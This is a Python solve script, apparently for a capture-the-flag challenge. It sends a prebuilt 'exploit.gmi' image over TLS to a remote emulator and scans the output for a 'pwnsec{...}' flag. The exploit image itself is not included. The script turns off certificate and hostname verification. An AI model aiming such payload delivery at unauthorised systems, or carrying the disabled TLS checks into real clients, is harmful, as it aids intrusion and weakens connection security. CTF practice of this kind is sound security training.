#!/usr/bin/env python3
"""Send the locally verified GMI image to an ICX Regulate TLS instance."""

import argparse
import hashlib
import re
import socket
import ssl
import sys
import time
from pathlib import Path


FLAG_RE = re.compile(rb"(?i)pwnsec\{[^}\r\n\x00]{1,256}\}")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host", help="instance hostname, without tls://")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--payload", type=Path, default=Path("exploit.gmi"))
    ap.add_argument("--timeout", type=float, default=360.0,
                    help="total receive deadline in seconds (default: 360)")
    ap.add_argument("--post-marker-timeout", type=float, default=60.0,
                    help="deadline after S1 is observed (default: 60)")
    args = ap.parse_args()

    payload = args.payload.read_bytes()
    if len(payload) != 0x6000 or payload[:3] != b"GMI":
        ap.error("payload must be the 0x6000-byte packed GMI image")

    digest = hashlib.sha256(payload).hexdigest()
    print(f"[*] payload={args.payload} size={len(payload)} sha256={digest}",
          file=sys.stderr)

    # SNI is needed by the challenge TLS frontend.  The emulator speaks a
    # tiny text protocol: "load <hex>" followed by "run".
    raw = socket.create_connection((args.host, args.port), timeout=20)
    tls_context = ssl.create_default_context()
    # CTF frontends are commonly deployed with an ephemeral/self-signed cert;
    # encryption and SNI matter here, PKI authentication does not.
    tls_context.check_hostname = False
    tls_context.verify_mode = ssl.CERT_NONE
    io = tls_context.wrap_socket(raw, server_hostname=args.host)
    transcript = bytearray()
    absolute_deadline = time.monotonic() + args.timeout
    marker_deadline = None

    def receive_until(needle: bytes, deadline: float) -> bool:
        """Receive and mirror output until *needle* is seen."""
        while needle not in transcript:
            now = time.monotonic()
            if now >= deadline:
                return False
            try:
                io.settimeout(min(5.0, deadline - now))
                chunk = io.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                return False
            transcript.extend(chunk)
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
        return True

    try:
        if not receive_until(b"> ", absolute_deadline):
            print("\n[-] no initial emulator prompt", file=sys.stderr)
            return 2

        transcript.clear()
        io.sendall(b"load " + payload.hex().encode("ascii") + b"\n")
        if not receive_until(b"> ", absolute_deadline):
            print("\n[-] image load timed out", file=sys.stderr)
            return 2
        if b"The image is ready." not in transcript:
            print("\n[-] emulator rejected the image", file=sys.stderr)
            return 2

        transcript.clear()
        io.sendall(b"run\n")
        while True:
            now = time.monotonic()
            deadline = min(absolute_deadline,
                           marker_deadline or absolute_deadline)
            if now >= deadline:
                reason = "post-S1" if marker_deadline else "overall"
                print(f"\n[-] {reason} timeout without a flag", file=sys.stderr)
                return 3

            try:
                io.settimeout(min(5.0, deadline - now))
                chunk = io.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                print("\n[-] remote closed before a flag was found",
                      file=sys.stderr)
                return 2

            transcript += chunk
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()

            if marker_deadline is None and b"S1\n" in transcript:
                marker_deadline = time.monotonic() + args.post_marker_timeout

            match = FLAG_RE.search(transcript)
            if match:
                flag = match.group(0).decode("ascii", "strict")
                print(f"\n[+] FLAG={flag}", file=sys.stderr)
                return 0
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())
